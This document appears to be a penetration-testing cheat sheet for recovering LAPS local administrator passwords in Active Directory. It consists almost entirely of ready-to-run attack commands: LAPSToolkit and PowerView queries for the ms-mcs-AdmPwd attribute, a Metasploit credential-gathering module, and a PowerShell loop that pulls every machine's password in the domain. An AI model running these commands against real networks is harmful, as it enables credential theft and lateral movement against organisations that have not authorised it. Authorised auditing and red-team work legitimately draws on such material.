# LAPS

% laps, password

## get laps passwords
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```powershell
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

## get laps computer list
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

## find the list of group who can manipulate SAM data
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
```

## powerview get laps password
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```powershell
Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
```

## metasploit get laps password
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```bash
use windows/gather/credentials/enum_laps
```

## get all machine passwords
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```powershell
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```
